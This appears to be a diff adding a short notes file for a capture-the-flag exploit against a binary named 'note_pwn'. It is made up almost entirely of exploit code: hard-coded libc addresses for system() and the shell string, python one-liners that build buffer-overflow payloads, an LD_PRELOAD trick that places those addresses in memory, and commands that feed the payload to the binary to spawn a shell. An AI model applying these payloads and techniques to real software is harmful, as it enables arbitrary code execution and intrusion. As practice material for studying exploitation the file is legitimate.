@@ -1,0 +1,24 @@
+searchmem AAAA 0x55578000 0x5557a000
+rop_stage = 0x55579857
+
+sh      = 0x556e4a24
+system  = 0x555c4190
+
+export LD_PRELOAD=`python -c "print 'AAAA' + '\x90\x41\x5c\x55' + 'AAAA' + '\x24\x4a\x6e\x55'"`
+
+
+python -c "print 'AAAA'+'A'*0x28+'\x57\x98\x57\x55'" > payload
+
+# ulimit -s unlimited
+# export LD_PRELOAD=`python -c "print 'AAAA' + '\x70\x0e\x5c\x55' + 'AAAA' + '\x69\xf4\x58\x55'"`
+# python -c "print 'A'*0x28+'\x2f\x8e\x57\x55'" > /tmp/ice/payload
+# cat /tmp/ice/payload - | ./note_pwn
+
+# ulimit -s unlimited
+# export LD_PRELOAD=`python -c "print 'A'*29 + '\xa0\x5e\x63\x55' + 'AAAA' + '\x8c\xea\x6d\x55' + '\x00'*0x8"`
+# python -c "print 'A'*0x28+'\xd0\x8e\x57\x55'" > /tmp/payload
+# cat /tmp/payload - | ./note_pwn
+
+
+cat payload - | ./note
+(echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2f\x8e\x57\x55";cat -) | ./note_pwn
